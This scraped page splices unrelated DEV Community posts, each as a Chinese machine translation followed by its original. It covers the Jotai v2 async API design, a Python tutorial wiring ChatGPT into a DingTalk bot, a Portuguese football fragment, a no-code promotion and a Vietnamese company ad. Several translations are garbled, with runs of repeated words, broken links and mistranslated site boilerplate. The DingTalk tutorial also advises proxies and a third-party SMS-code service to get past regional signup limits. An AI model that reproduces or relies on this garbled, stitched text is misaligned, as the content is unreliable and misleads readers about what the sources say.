此外，RFC 声明我们应该尽可能使用 async/await，而use hook 是目前不可避免的解决方案。

这让我们考虑使用新的 Async API。

新的异步 API

我们已经区分了同步原子和异步原子。

 const syncAtom = atom (() => 0 ); // Atom<number> const asyncAtom = atom ( async () => 0 ); // Atom<Promise<number>>

但是，当我们使用get函数获取原子值时，它会返回相同的值。

 const derived1 = atom (( get ) => get ( syncAtom )); // Atom<number> const derived2 = atom (( get ) => get ( asyncAtom )); // Atom<number>

这是可能的，因为它使用异步原子暂停和重播。 这意味着derived2可以挂起，因为它依赖于一个异步原子，即使derive2的签名是一个同步原子。

新的 API 避免了这种行为，只是暴露了承诺。 它没有做任何特别的事情来处理承诺。 使用新的 API，哪些原子将从它们的类型中暂停是明确的。 只有具有承诺值的原子才能暂停。

新 API 的缺点是什么？ 显然，我们不能再同步读取异步原子值。

要同步使用异步原子值， loadable util 可能在一定程度上有所帮助。

 // New API const derived3new = atom (( get ) => get ( loadable ( asyncAtom ))); // Atom<Loadable<number>>>

我们还考虑添加一个名为unwrap （暂定名称）的新实用程序。

 // New API const derived4new = atom (( get ) => get ( unwrap ( asyncAtom , - 1 ))); // Atom<number>>

请注意， -1是默认值，当asyncAtom最初没有值时使用。

我们将在 v2 中发布新的 Async API。 虽然 v1 API 在很大程度上受到 Recoil 的启发，但 v2 API 不受 Recoil 的启发，并且与 Recoil API 不兼容。 我们将学习 v2 API 是如何运行的。 可能会有一些困难。 话虽如此，目前看起来很有希望，因为异步行为相当简单，没有“挂起和重播”。 它使得公开商店 API 成为可能，这是一些 Jotai 用户期待已久的功能。

最大的问题是新的 Async API 正在发生重大变化。 最重要的是，语法没有改变，只有行为改变了。 希望大多数 Jotai 用户会使用 TypeScript，在这种情况下，更容易注意到变化，因为 TypeScript 编译器会抱怨无效用法。

迁移策略

如果在语法上进行更改会更容易，我们可以同时拥有新的和旧的并弃用旧的。

问题是它只会破坏异步原子。 我们假设相当多的用户仅将 Jotai 与同步原子一起使用，并且同步原子没有任何问题。

我们需要新 API 的主要版本，因此它将成为 v2 API。

为了减轻迁移到新 API 的压力，我们将在不同的入口点提供它。

 // New API import { atom } from ' jotai/vanilla ' ; import { useAtom } from ' jotai/react ' ;

这使我们能够在 v1 中预发布新的 API。

我们在不同的入口点提供它还有另一个原因。 它将允许在非 React 环境中使用 Jotai。 例如，有一个项目可以在没有 React 的情况下运行 Jotai 应用程序。 查看项目的 PR 。

我们考虑过在跳转到 v2 之前是否应该弃用 v1 API，但这只会给同步原子用户带来麻烦。 一些反馈建议直接跳转到 v2。

因此，我们的计划是在 v1 中预发布新 API，然后发布 v2 以仅包含新 API。

 // In v2 import { atom , // same as import { atom } from 'jotai/vanilla'; useAtom , // same as import { useAtom } from 'jotai/react'; } from ' jotai ' ;

这种方式允许同步原子用户简单地更新到 v2 而不会出现任何问题。

它还允许 async atom 用户尝试 v1 中的新 API 并迁移到它，迁移后的代码也将在 v2 中工作。

结语

我们已经使用各种集成库尝试了新的 API，如下所示：

我们鼓励所有 Jotai 用户，无论他们使用异步原子还是只使用同步，都可以尝试自jotai v1.11.0以来预发布的新异步 API（aka v2 API）。

最初于 2022 年 12 月 6 日发布在https://blog.axlight.com 。

埃尔南德·蒙泰罗 - 一旦暂停，dai_shi 将无法发表评论或发布帖子，直到他们的暂停被删除。

解除暂停后，dai_shi 将能够再次发表评论和发布帖子。

一旦取消发布，dai_shi 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 dai_shi 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 您可以通过以下方式标记 dai_shi：

报告其他不当行为

取消标记 dai_shi 将恢复其帖子的默认可见性。



原文:

Jotai is a library for React state management.

The API (let's call it v1 API) is designed to a) be friendly with Concurrent React, and b) be compatible with Recoil as much as possible.

What does it mean? First, atom read function is evaluated in the render phase in React.

For example, consider a simple derived atom.

const countAtom = atom(0);
const doubleAtom = atom((get) => get(countAtom) * 2);

In the example, (get) => get(countAtom) * 2 is the read function. When countAtom is updated, the library doesn't invoke the read function of doubleAtom immediately. Instead, it triggers the component that uses doubleAtom to re-render. The component re-renders eventually, and it's when the read function of doubleAtom is invoked. The benefit of this behavior might be hypothetical, but React allows to schedule re-renders, which means it can skip invoking read functions in concurrent rendering.

Another behavior in v1 API is that async atoms can suspend and replay.

For example, let's see an example.

const countAtom = atom(0);
const asyncAtom = atom(async (get) => { const isEven = get(countAtom) % 2 === 0; await someAsyncFunction(); return isEven;
});
const derivedAtom = atom((get) => { const isEven = get(asyncAtom); return isEven ? "even" : "odd";
});

It might be a little complex. The first atom is a primitive atom, the second atom is an async atom that depends on the first atom, and the third atom is a "sync" atom that depends on the second atom which is "async".

When countAtom is changed and the read function of derivedAtom is invoked, then the read function of asyncAtom is evaluated and, it suspends because it returns a promise. When the promise is resolved, asyncAtom has a resolved value, and the Jotai library re-evaluates the read function of derivedAtom.

The read function of derivedAtom may return the same value when countAtom value is increased by say two. In such a case, the rendering bails out and it doesn't make changes to DOM.

That is basically how v1 API is designed. It's been a while since the initial release, and it turns out that v1 API has some limitations.

Two major problems

Evaluating the read function is intentional as described, but the behavior is a little difficult to understand. Consider the following example:

const countAtom = atom(0);
const derivedAtom = atom((get) => { const isEven = get(countAtom); return isEven ? "even" : "odd";
});

When the countAtom value is increased by two, the read function of derivedAtom is re-evaluated, but it returns the same value as before. In React 17, it can't be observed because of early bail out in useReducer.

In React 18, the useReducer behavior is changed and it does't early bail out. It's a good thing for the Jotai library, because we want to delay the evaluation of read functions. However, this behavior is very confusing to many developers, because people often use console.log to debug rendering behaviors.

See also an example in this tweet.

We call this behavior "extra re-renders without commits",
and it's an expected behavior as a design. If this behavior can cause heavy computation, we can use useMemo to avoid it. However, it's confusing anyways.

Another issue is with store API. We have an internal store API in v1 API, and we try to expose it for more use cases with unstable_createStore. Its difficulty is with async atoms. We can't expose "suspend and replay" behavior, because it's not very understandable.

const store = unstable_createStore();
const countAtom = atom(0);
const asyncAtom = atom(async (get) => { await new Promise((r) => setTimeout(r, 1000)); return get(countAtom);
}); store.get(asyncAtom); // returns `undefined` while asyncAtom is pending.
store.getAsync(countAtom); // returns a promise even though countAtom is not async.

It's hypothetically impossible to provide a better API, because we can't distinguish if an atom will suspend or not. (A sync atom that depends on an async atom may suspend.)

Meanwhile, the React team opens a new RFC with a new hook named use.

The use RFC

The RFC is here: https://github.com/reactjs/rfcs/pull/229

As of writing, that RFC is not yet finalized, but it's enough to make us re-think the Jotai API. The new use hook can resolve a promise with the suspend-and-replay behavior, just like we could throw a promise previously.
However, it doesn't allow to use use anywhere. You can only use use in other hooks. It means that the suspend-and-replay behavior that's done in Jotai library can't be replaced with use.

Furthermore, the RFC states we should prefer async/await if possible, and the use hook is an unavoidable solution for now.

This made us to consider new Async API.

New Async API

We already distinguish sync atoms and async atoms.

const syncAtom = atom(() => 0); // Atom<number>
const asyncAtom = atom(async () => 0); // Atom<Promise<number>>

However, when we use get function to get atom values, it returns same values.

const derived1 = atom((get) => get(syncAtom)); // Atom<number>
const derived2 = atom((get) => get(asyncAtom)); // Atom<number>

This is possible because it suspends and replays with async atoms. It means the derived2 can suspend because it depends on an async atom even though the signature of derive2 is a sync atom.

The new API avoids such behavior and just expose promises. It doesn't do anything special to handle promises. The get function returns a value even if it's a promise, instead of resolving the promise.

// New API
const derived1new = atom((get) => get(syncAtom)); // Atom<number>
const derived2new = atom((get) => get(asyncAtom)); // Atom<Promise<number>>

With the new API, it's explicit what atoms will suspend from their types. Only atoms with promise values can suspend.

What's the downside of the new API? We can no longer read async atom values in sync, obviously.

To use async atom values in sync, loadable util may help to certain extent.

// New API
const derived3new = atom((get) => get(loadable(asyncAtom))); // Atom<Loadable<number>>>

We also consider adding a new util called unwrap (tentative name).

// New API
const derived4new = atom((get) => get(unwrap(asyncAtom, -1))); // Atom<number>>

Note that -1 is a default value which is used while asyncAtom doesn't have a value initially.

We will release the new Async API in v2. While the v1 API is heavily inspired by Recoil, the v2 API is not inspired by Recoil, and is incompatible with Recoil API. (The sync atom behavior is probably compatible.)

We will learn how the v2 API goes. There might be some difficulties. Having that said, it seems promising at the moment, because the async behavior is rather straightforward without "suspend and replay". It makes it possible to expose the store API, which is a long awaited feature for some Jotai users.

The biggest problem is that the new Async API is breaking change. Most importantly, the syntax isn't changed, and only behavior is changed. Hopefully, most Jotai users would use TypeScript, and in such case, it's a little easier to notice the change because TypeScript complier complains the invalid usage.

Migration strategy

It would have been easier if the change were in syntax, and we could have both new one and old one and deprecate the old one.

The thing is it's only breaking for async atoms. We assume quite a few users use Jotai only with sync atoms, and there's nothing breaking with sync atoms.

We need a major version up for the new API, thus it's going to be v2 API.

To mitigate migrating to the new API, we will provide it in different entry points.

// New API
import { atom } from 'jotai/vanilla';
import { useAtom } from 'jotai/react';

This allows us to pre-release the new API in v1.

There's another reason why we provide it in different entry points. It would allow using Jotai in non-React environments. For example, there's a project to run Jotai apps without React. See a PR of the project.

We considered if we should deprecate v1 API before jumping to v2, but it would just be a trouble for sync atom users. Some feedbacks suggested to directly jumping to v2.

So, our plan is to pre-release the new API in v1, and later release v2 to have only the new API.

// In v2
import { atom, // same as import { atom } from 'jotai/vanilla'; useAtom, // same as import { useAtom } from 'jotai/react';
} from 'jotai';

That way allows for sync atom users to simply update to v2 without any problems.

It also allows async atom users to try the new API in v1 and migrate to it, and the migrated code will work in v2 too.

Closing note

We already tried the new API with various integration libraries as follows:

We encourage all Jotai users, whether they use async atoms or sync only, to try the new Async API (a.k.a. v2 API) pre-released since jotai v1.11.0.

Originally published at https://blog.axlight.com on December 6, 2022.

☝️ Check out this all-time classic DEV post

Hernande Monteiro - Nov 29

Once suspended, dai_shi will not be able to comment or publish posts until their suspension is removed.

Once unsuspended, dai_shi will be able to comment and publish posts again.

Once unpublished, all posts by dai_shi will become hidden and only accessible to themselves.

If dai_shi is not suspended, they can still re-publish their posts from their dashboard.

Thanks for keeping DEV Community 👩‍💻👨‍💻 safe. Here is what you can do to flag dai_shi:

dai_shi consistently posts content that violates DEV Community 👩‍💻👨‍💻's code of conduct because it is harassing, offensive or spammy.

Report other inappropriate conduct

Unflagging dai_shi will restore default visibility to their posts.

item.title: 把碗言欢,款款而谈,ChatGPT结合钉钉机人(outgoing回调)打造人工智能群聊/单聊场景,基于Python3.10 | 把盏言欢,款款而谈,ChatGPT结合钉钉机器人(outgoing回调)打造人工智能群聊/单聊场景,基于Python3.10
item.description:
就像里的核弹一样一样一样，openai gatgpt语言语言语言出世出世出世出世出世，是语言的出世出世出世的，是是是智能智能智能技术技术发展史上的一一个个重要重要里程碑里程碑。。这这这是是是一款无无对话，并具有出色的语言生成能力。

好吧，本文的开头其实是由ChatGPT生成的：

没办法，面对时代的也已经鞭长莫及。

一句话：言语不能赞其伟大。

下次我们利用ChatGPT的开放API接入钉钉群聊/单聊机器，让钉钉机器装备进自然语言推论和对话的能力，所称拙为不拙。

注册并使用 OpenAi 的 ChatGPT

同时，接受验证码手机号也必须是美国地区的手机号，这里推荐一个美国地区的连接码平台： https ://sms.qisms.com/index非常实用。

注册成功之后，这里推荐github上开源大神rawandahmad698已经封安装好的开源SDK，避免重新生成轮子： https://github.com/rawandahmad698/PyChatGPT

安装SDK：

 pip3 install chatgptpy --upgrade

安装好之后，编写测试脚本：

 chat = Chat(email="OpenAi邮箱", password="OpenAi密码",proxies="代理地址") answer = chat.ask("你好") print(answer)

注意，运行代理码之前，一定要使用代理代理，并且确保是北美洲地区的IP地址。

程序返回：

配置钉钉钉钉机器人

随后，我们来配置C端的机器人，注意这里一定要使用支持outgoing回调的企业机器人，而不是通用的机器人，参考文档： https ://open.open.botse-group-d/enterchabot-group.com/do

创业机器人之后，获取机器人应用的Key和秘钥，同时配置好出口IP和接口地址：

机器人异步异步来接受所有来自的的信息信息信息信息信息信息信息信息信息的信息的信息信息信息机器人机器人机器人机器人说说说的话的话的话的话的话的话的话的话的话的话的话的话机器人机器人机器人机器人机器人，需要需要的话，需要的是是，后端是是是是，后端是是的话的话，后端钉的合法请求，避免其他冒钉钉调用开发者的HTTPS服务传送数据。

所以这里一签名字有问题，就结束束缚了：

 timestamp = self.request.headers.get('timestamp', None) sign = self.request.headers.get('sign', None) app_secret = '钉钉机器人秘钥' app_secret_enc = app_secret.encode('utf-8') string_to_sign = '{}\n{}'.format(timestamp, app_secret) string_to_sign_enc = string_to_sign.encode('utf-8') hmac_code = hmac.new(app_secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest() my_sign = base64.b64encode(hmac_code).decode('utf-8') if sign != my_sign: return self.finish({"errcode":1,"msg":"签名有误"})

最后应该接口会返回信息人id（uid）以及工具体信息内容（text）。

至此，后端接受服务就配置好了。

下面就是后端推送服务，首先，根据官方文档： https://open.dingtalk.com/document/orgapp-server/obtain-the-access\_token-of-an-internal-app?spm=ding\_open \_doc.document.0.0.5f255239xgW3zE#topic-2056397

需要获取钉钉接口的token：

 def get_token(self): res = requests.post("https://api.dingtalk.com/v1.0/oauth2/accessToken",data=json.dumps({"appKey":self._appKey,"appSecret":self._appSecret}),headers={"Content-Type":"application/json"}) token = res.json()["accessToken"] return token

随着后，根据文档： https://open.dingtalk.com/document/group/chatbots-send-one-on-one-chat-messages-in-batches?spm=ding\_open\_doc.document.0.0.22e749acXECz5m #topic-2080109

我们来配置单聊推荐：

 # 单聊def send_message(self,uid,message): res = requests.post("https://api.dingtalk.com/v1.0/robot/oToMessages/batchSend",data=json.dumps({"robotCode":self._appKey,"userIds":[uid],"msgKey":"sampleText","msgParam":'{"content":"'+message+'"}'}),headers={"Content-Type":"application/json","x-acs-dingtalk-access-token":self._token}) print(res.text)

具体效果：

接着，继续根据官方文档： https://open.dingtalk.com/document/robots/guide-to-user-access-for-intra-enterprise-robot-group-chat

配置群聊推荐方法：

 # 群聊def send_user(self,uid,message): data = { "at": { "atUserIds": [ uid ] }, "text": { "content": message }, "msgtype": "text" } res = requests.post(self._webhook,data=json.dumps(data),headers={"Content-Type":"application/json"}) print(res.text)

群聊效果：

这里需要是是，单聊通过接口进行推送推送推送推送推送，webhook，webhook，webhook，webhook，webhook，请请： python3.7 python3.7配置年新版攻略)

完整代码：

 import requests import json from pychatgpt import Chat class DingDing: def __init__(self,appKey=None,appSecret=None) -> None: self._appKey = appKey self._appSecret = appSecret self._token = self.get_token() # 机器人webhook地址self._webhook = "" def get_token(self): res = requests.post("https://api.dingtalk.com/v1.0/oauth2/accessToken",data=json.dumps({"appKey":self._appKey,"appSecret":self._appSecret}),headers={"Content-Type":"application/json"}) token = res.json()["accessToken"] return token # 单聊def send_message(self,uid,message): res = requests.post("https://api.dingtalk.com/v1.0/robot/oToMessages/batchSend",data=json.dumps({"robotCode":self._appKey,"userIds":[uid],"msgKey":"sampleText","msgParam":'{"content":"'+message+'"}'}),headers={"Content-Type":"application/json","x-acs-dingtalk-access-token":self._token}) print(res.text) # 群聊def send_user(self,uid,message): data = { "at": { "atUserIds": [ uid ] }, "text": { "content": message }, "msgtype": "text" } res = requests.post(self._webhook,data=json.dumps(data),headers={"Content-Type":"application/json"}) print(res.text) if __name__ == '__main__': dingding = DingDing("appkey","appSecret") #chat = Chat(email="OpenAi邮箱", password="OpenAi密码",proxies="代理地址") #answer = chat.ask("你好") # 单聊#dingding.send_message('uid',answer) # 群聊#dingding.send_user('uid',answer) #print(answer)

至此，后端推送服务就配置好了。

原文:

就像黑火药时代里突然诞生的核弹一样，OpenAI的ChatGPT语言模型的横空出世，是人工智能技术发展史上的一个重要里程碑。这是一款无与伦比、超凡绝伦的模型，能够进行自然语言推理和对话，并且具有出色的语言生成能力。

好吧，本篇的开头其实是由ChatGPT生成的：

没办法，面对这个远超时代的AI产品，我们能说什么呢？顶礼膜拜？惊为天人？任何言语对于描述ChatGPT来说已经是苍白无力的，而辞海中的形容词在面对ChatGPT时也已经鞭长莫及。

一句话：言语不能赞其伟大。

本次我们利用ChatGPT的开放API接入钉钉群聊/单聊机器人，让钉钉机器人具备进行自然语言推理和对话的能力，所谓化腐朽为神奇，不过如此。

注册和使用OpenAi的ChatGPT

首先注册OpenAi平台：https://beta.openai.com/ ，由于ChatGPT过于火爆，导致很多地区无法正常注册，这里推荐使用北美地区的代理IP，与此同时，一定要注意，如果之后希望使用后端的API接口方式调用ChatGPT，就不要使用谷歌或者微软的三方账号进行登录，否则无法通过邮箱和秘钥交换OpenAi平台的access_token，切记。

同时，接受验证码手机号也必须是北美地区的手机号，这里推荐一个北美地区的接码平台：https://sms.qisms.com/index 非常好用。

注册成功之后，这里推荐github上开源大神rawandahmad698已经封装好的开源SDK，避免重复造轮子：https://github.com/rawandahmad698/PyChatGPT

安装SDK:

pip3 install chatgptpy --upgrade

安装好之后，编写测试脚本：

chat = Chat(email="OpenAi邮箱", password="OpenAi密码",proxies="代理地址")  

answer = chat.ask("你好")  

print(answer)

注意，运行代码之前，一定要使用代理proxies，并且确保是北美地区的IP地址。

配置钉钉Dingding机器人

随后，我们来配置C端的机器人，注意这里一定要使用支持outgoing回调的企业机器人，而不是普通的机器人，参考文档：https://open.dingtalk.com/document/group/enterprise-created-chatbot

创建好企业机器人之后，获取机器人应用的Key和秘钥，同时配置好出口IP和接口地址：

所谓出口IP即调用钉钉服务合法的ip，消息接受地址是接受C端信息的地址，这里我们使用异步非阻塞的Tornado框架来构建接受信息服务：

import hmac  
import hashlib  
import base64  
import json  
import tornado  

from tornado.options import define, options  
define('port', default=8000, help='default port',type=int)  

class Robot(tornado.web.RequestHandler):  

    async def post(self):  


        timestamp = self.request.headers.get('timestamp', None)  

        sign = self.request.headers.get('sign', None)  
        app_secret = '钉钉机器人秘钥'  
        app_secret_enc = app_secret.encode('utf-8')  
        string_to_sign = '{}\n{}'.format(timestamp, app_secret)  
        string_to_sign_enc = string_to_sign.encode('utf-8')  
        hmac_code = hmac.new(app_secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest()  
        my_sign = base64.b64encode(hmac_code).decode('utf-8')  
        if sign != my_sign:  
            return self.finish({"errcode":1,"msg":"签名有误"})  
        data = json.loads(self.request.body)  
        text = data['text']["content"]  
        atUsers = data.get("atUsers",None)  
        uid = data.get("senderStaffId",None)  
        return self.finish({"errcode":0,"msg":text})  

urlpatterns = [  
    (r"/robot_chat/",Robot),  
]  


# 创建Tornado实例  
application = tornado.web.Application(urlpatterns,debug=True)  


if __name__ == "__main__":  
    tornado.options.parse_command_line()  
    application.listen(options.port)  
    tornado.ioloop.IOLoop.instance().start()

这里我们通过Robot异步控制器来接受所有来自钉钉客户端的信息，即人类对机器人说的话，需要注意的是，后端服务需要对请求头中的timestamp和sign进行验证，以判断是否是来自钉钉的合法请求，避免其他仿冒钉钉调用开发者的HTTPS服务传送数据。

所以这里一旦签名有问题，就结束逻辑：



timestamp = self.request.headers.get('timestamp', None)  

sign = self.request.headers.get('sign', None)  
app_secret = '钉钉机器人秘钥'  
app_secret_enc = app_secret.encode('utf-8')  
string_to_sign = '{}\n{}'.format(timestamp, app_secret)  
string_to_sign_enc = string_to_sign.encode('utf-8')  
hmac_code = hmac.new(app_secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest()  
my_sign = base64.b64encode(hmac_code).decode('utf-8')  
if sign != my_sign:  
    return self.finish({"errcode":1,"msg":"签名有误"})

最后该接口会返回发信人id（uid）以及具体信息内容（text）。

至此，后端接受服务就配置好了。

下面就是后端推送服务，首先，根据官方文档：https://open.dingtalk.com/document/orgapp-server/obtain-the-access\_token-of-an-internal-app?spm=ding\_open\_doc.document.0.0.5f255239xgW3zE#topic-2056397

需要获取钉钉接口的token:

def get_token(self):  

        res = requests.post("https://api.dingtalk.com/v1.0/oauth2/accessToken",data=json.dumps({"appKey":self._appKey,"appSecret":self._appSecret}),headers={"Content-Type":"application/json"})  

        token = res.json()["accessToken"]  

        return token

随后，根据文档：https://open.dingtalk.com/document/group/chatbots-send-one-on-one-chat-messages-in-batches?spm=ding\_open\_doc.document.0.0.22e749acXECz5m#topic-2080109

我们来配置单聊推送：

# 单聊  
    def send_message(self,uid,message):  

        res = requests.post("https://api.dingtalk.com/v1.0/robot/oToMessages/batchSend",data=json.dumps({"robotCode":self._appKey,"userIds":[uid],"msgKey":"sampleText","msgParam":'{"content":"'+message+'"}'}),headers={"Content-Type":"application/json","x-acs-dingtalk-access-token":self._token})  

        print(res.text)

具体效果：

接着，继续根据官方文档：https://open.dingtalk.com/document/robots/guide-to-user-access-for-intra-enterprise-robot-group-chat

配置群聊推送方法：

# 群聊  
    def send_user(self,uid,message):  

        data = {  
        "at": {  
            "atUserIds": [  
                uid  
            ]  
        },  
        "text": {  
            "content": message  
        },  
        "msgtype": "text"  
        }  

        res = requests.post(self._webhook,data=json.dumps(data),headers={"Content-Type":"application/json"})  

        print(res.text)

群聊效果：

这里需要注意的是，单聊是通过接口的方式进行推送，而群内聊天是通过webhook方式进行推送，关于webhook，请移玉步至：使用python3.7配置开发钉钉群自定义机器人(2020年新版攻略)

完整代码：

import requests  
import json  

from pychatgpt import Chat  

class DingDing:  


    def __init__(self,appKey=None,appSecret=None) -> None:  

        self._appKey = appKey  

        self._appSecret = appSecret  

        self._token = self.get_token()  

        # 机器人webhook地址  
        self._webhook = ""  




    def get_token(self):  

        res = requests.post("https://api.dingtalk.com/v1.0/oauth2/accessToken",data=json.dumps({"appKey":self._appKey,"appSecret":self._appSecret}),headers={"Content-Type":"application/json"})  

        token = res.json()["accessToken"]  

        return token  

    # 单聊  
    def send_message(self,uid,message):  

        res = requests.post("https://api.dingtalk.com/v1.0/robot/oToMessages/batchSend",data=json.dumps({"robotCode":self._appKey,"userIds":[uid],"msgKey":"sampleText","msgParam":'{"content":"'+message+'"}'}),headers={"Content-Type":"application/json","x-acs-dingtalk-access-token":self._token})  

        print(res.text)  

    # 群聊  
    def send_user(self,uid,message):  

        data = {  
        "at": {  
            "atUserIds": [  
                uid  
            ]  
        },  
        "text": {  
            "content": message  
        },  
        "msgtype": "text"  
        }  

        res = requests.post(self._webhook,data=json.dumps(data),headers={"Content-Type":"application/json"})  

        print(res.text)  




if __name__ == '__main__':  

    dingding = DingDing("appkey","appSecret")  

    #chat = Chat(email="OpenAi邮箱", password="OpenAi密码",proxies="代理地址")  

    #answer = chat.ask("你好")  

    # 单聊  
    #dingding.send_message('uid',answer)  

    # 群聊  
    #dingding.send_user('uid',answer)  

    #print(answer)

至此，后端推送服务就配置好了。

结语

最后，奉上Github项目地址，与众亲同飨：https://github.com/zcxey2911/Python\_ChatGPT\_ForDingding\_OpenAi ，毫无疑问，ChatGPT是NLP领域历史上最伟大的项目，没有之一，伟大，就是技术层面的极致，你同意吗？

Farhana Binte Hasan - Dec 7

item.description:

发表于提名：贝尔纳多·席尔瓦、布鲁诺·费尔南德斯、若昂·费利克斯、场外球员、以及其他球员的反应。 开个玩笑，这是个人喜好。 但是你可以在你的设置中更改你的主题、字体等。

原文:

Na Beira do Campo

Posted on Dec 8

Fernando Santos, técnico de Portugal, respondeu essa pergunta na partida de hoje, através do seu esquema tático, contra a Suíça.
A seleção de Portugal chegou na Copa do Mundo como uma das seleções favoritas para vencer a competição. Entretanto, o que mudou desse Portugal, autor da grande goleada na partida de hoje, para aquele que começou a Copa? Fernando Santos sempre teve muitas críticas relacionadas ao seu trabalho, que na maioria das vezes fazem sentido, tendo em mente, o elenco que possui em suas mãos. Para muitos, é a melhor geração da história de Portugal, que dizem não ser bem aproveitada pelo português. O trabalho de Fernando pode não encaixar com o estilo de jogo dos atuais jogadores, quando você tem um time muito mais leve e habilidoso. Nomes como: Bernardo Silva, Bruno Fernandes, João Félix, entre outros, que são responsáveis por um estilo de jogo muito mais ofensivo. A ideia de Fernando sempre foi baseada em jogo mais "truncado", apostando bastante no físico dos jogadores, e, principalmente, no seu setor defensivo. Pode-se perceber na maioria de suas convocações, a presença de jogadores que possuem esse estilo, e na escolha de seus esquemas. Tendo como a principal referência Cristiano Ronaldo, o jogo chega a ser baseado no ídolo português, afinal, é o maior da história do país, e um dos maiores da história do mundo. Mesmo não vivendo uma boa fase, Fernando começou com Cristiano como titular na Copa do Mundo.

Em competições passadas, Fernando jogava em 4–1–4–1, fortalecendo a ideia de um jogo mais forte no meio-campo, com lançamentos diretos na procura do pivô feito por CR7.

Just kidding, it's a personal preference. But you can change your theme, font, etc. in your settings.

The more you know. 🌈

Maximiliano Burgos - Dec 7

item.title: 为什么无代码如此重要？ | Why no-code is so important?
item.description:
您之前可能听说过无代码，但为什么它如此重要？

在成为一名软件开发人员并在不同的初创公司和大型企业工作了十多年之后，我意识到未来应该看起来非常不同。 那时我开始更多地了解无代码，并最终创办了一家你们中的一些人可能熟悉的初创公司，名为DoTenX 。

在这篇文章中，我简要提到了每个技术人员都应该考虑使用无代码的一些关键原因。

无代码技术正在彻底改变企业和个人处理数字项目的方式。 随着DoTenX等无代码平台的兴起，即使没有技术背景的人也可以轻松创建自己的网站、应用程序和其他数字解决方案。

无代码技术的最大优势之一是它的可访问性。 过去，创建数字解决方案通常需要大量的专业技术知识和昂贵的软件。 这意味着只有拥有专门开发人员团队的大公司才能负担得起创建自己的数字产品。

然而，无代码平台使这一过程民主化，允许任何有远见和愿意学习的人创建自己的数字解决方案。 这为想要构建自己的网站、应用程序和其他数字工具的小型企业、企业家和个人开辟了一个充满可能性的全新世界。

无代码技术的另一个主要优势是它的速度和效率。 传统的开发过程可能缓慢而繁琐，步骤繁多，不同团队成员之间来来回回。 另一方面，无代码平台允许用户快速轻松地构建和测试他们的想法，从而可以在使用传统方法所需时间的一小部分时间内将产品推向市场。

无代码技术还具有高度可扩展性。 随着企业的发展，其数字化需求可能会迅速超过其现有系统的能力。 使用无代码平台，可以轻松地根据需要添加新特性和功能，而无需从头开始完全重建整个系统。

除了这些实际好处之外，无代码技术还有可能为以前可能被排除在数字开发世界之外的人们开辟新的机会。 通过让任何人都可以创建自己的数字解决方案，无代码技术可以帮助创造公平的竞争环境，并赋予来自不同背景的人们创新和创造的能力。

总体而言，无代码技术的兴起是数字创新领域的重大发展。 它的可访问性、速度、可扩展性和民主化的潜力使其成为企业和个人的宝贵工具。 随着越来越多的人发现无代码平台的力量，我们很可能会看到新的和令人兴奋的数字产品和解决方案的爆炸式增长。

如果您今天想从无代码开始，您可以在https://dotenx.com创建一个免费帐户并提高您的工作效率并立即实施您的想法。



原文:

You might have heard about no-code before but why is it so important?

After more than a decade of being a software developer and working in different startups and large enterprises I realised the future should look very different. That's when I started to learn more about no-code and ultimately started a startup some of you might be familiar with, named DoTenX.

In this post I briefly mention some of the key reasons everyone in tech should consider using no-code.

No-code technology is revolutionizing the way businesses and individuals approach digital projects. With the rise of no-code platforms such as DoTenX, even those without a technical background can easily create their own websites, apps, and other digital solutions.

One of the biggest advantages of no-code technology is its accessibility. In the past, creating digital solutions often required a significant amount of technical expertise and expensive software. This meant that only large companies with dedicated teams of developers could afford to create their own digital products.

However, no-code platforms have democratized the process, allowing anyone with a vision and a willingness to learn to create their own digital solutions. This has opened up a whole new world of possibilities for small businesses, entrepreneurs, and individuals who want to build their own websites, apps, and other digital tools.

Another key benefit of no-code technology is its speed and efficiency. Traditional development processes can be slow and cumbersome, with many steps and a lot of back-and-forth between different team members. No-code platforms, on the other hand, allow users to quickly and easily build and test their ideas, making it possible to bring a product to market in a fraction of the time it would take using traditional methods.

No-code technology is also highly scalable. As a business grows, its digital needs can quickly outpace the capabilities of its existing systems. With no-code platforms, it's easy to add new features and capabilities as needed, without having to completely rebuild the entire system from scratch.

In addition to these practical benefits, no-code technology also has the potential to open up new opportunities for people who may have previously been excluded from the world of digital development. By making it possible for anyone to create their own digital solutions, no-code technology can help level the playing field and give people from all backgrounds the ability to innovate and create.

Overall, the rise of no-code technology is a major development in the world of digital innovation. Its accessibility, speed, scalability, and potential for democratization make it a valuable tool for businesses and individuals alike. As more and more people discover the power of no-code platforms, it's likely that we'll see an explosion of new and exciting digital products and solutions.

If you want to start with no-code today, you can create a free account at https://dotenx.com and boost your productivity and implement your ideas in no time.

Posted on Dec 8

"Công ty cổ phần Nông nghiệp Nghi Anh là doanh nghiệp thương mại hoạt động trong lĩnh vực nông nghiệp chuyên về vật tư nông nghiệp, sản phẩm dinh dưỡng cây trồng và các sản phẩm bảo vệ mùa màng chất lượng cao. Ứng dụng khoa học kỹ thuật công nghệ cao trong các lĩnh vực nông nghiệp phục vụ cho nghiên cứu, chọn lọc, sản xuất và kinh doanh trên các đối tượng: thuốc bảo vệ thực vật, phân bón, vật tư nông nghiệp và chuyển giao dịch vụ kỹ thuật nông lâm nghiệp. Bởi đó chúng tôi vẫn luôn luôn trên đà phấn đấu, xây dựng, củng cố thương hiệu kinh doanh và cạnh tranh lành mạnh trên thị trường. Với phương châm “Tốt đất, khoẻ cây, xây thành quả” chúng tôi vẫn đang nổ lực không ngừng để cung cấp ra thị trường cho khách hàng nói chung và cho bà con nông dân nói riêng những sản phẩm thuốc bảo vệ thực vật đảm bảo chất lượng, phân bón tốt, chuyển giao các dịch vụ khoa học kỹ thuật tiên tiến hiệu quả để có thể đem lại sự hài lòng cho bà con nông dân cũng như quý khách hàng trên mọi miền của đất nước và đóng góp tích cực cho sự phát triển của nghành nông nghiệp Việt Nam.

Website: https://nongnghiepnghianh.vn Địa chỉ: Ngõ 237, Ngô Xuân Quảng, Trâu Quỳ, Gia Lâm, Hà Nội. SĐT: 0966.753.735

Email: ducthanhagri@gmail.com"

item.title: Discussão sobre o Advent of Code 2022 - Dia 4: Algebra booliana e ordenação | Discussão sobre o Advent of Code 2022 - Dia 4: Algebra booliana e ordenação
item.description:
四开本是《代码的来​​临》 ，它是关于讨论的问题，它是一个完整的或部分的语言，它是Rust语言的实现。

考虑事项

